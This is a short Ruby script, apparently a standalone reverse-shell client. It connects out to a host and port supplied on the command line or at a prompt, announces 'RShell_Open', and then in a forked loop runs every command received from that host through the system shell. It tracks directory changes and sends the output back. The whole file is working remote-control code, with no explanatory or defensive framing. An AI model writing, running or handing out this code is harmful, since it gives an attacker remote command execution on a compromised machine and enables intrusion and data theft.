require "socket"

if ARGV[0] && ARGV[1]
host = ARGV[0]
port = ARGV[1].to_i
else
print "Host: "
host = gets.chomp
print "Port: "
port = gets.chomp.to_i
end



host = TCPSocket.open(host, port)
host.puts "RShell_Open"

begin
	`pwd`
	currentDirCommand = "pwd"
	joiner = "\; "
rescue
	`cd`
	currentDirCommand = "cd"
	joiner = "\& "
end
host.puts currentDirCommand

fork do
	loop do
		cmd = host.gets.chomp
		if cmd.downcase == "exit"
			host.close
			break
		else
			begin
				if cmd.split(" ")[0].downcase == "cd" && cmd.split(" ")[1]
					currentDir = `cd "#{currentDir}"#{joiner}#{cmd}#{joiner}#{currentDirCommand}`.chomp
					out = ""
				else
					out = `cd "#{currentDir}"#{joiner}#{cmd.chomp}`
				end
			rescue
				out = "Unable to execute command"
			end
			host.puts out.gsub("\n", "\\NEWLINE")
		end
	end
end




# Process.detach(pid)
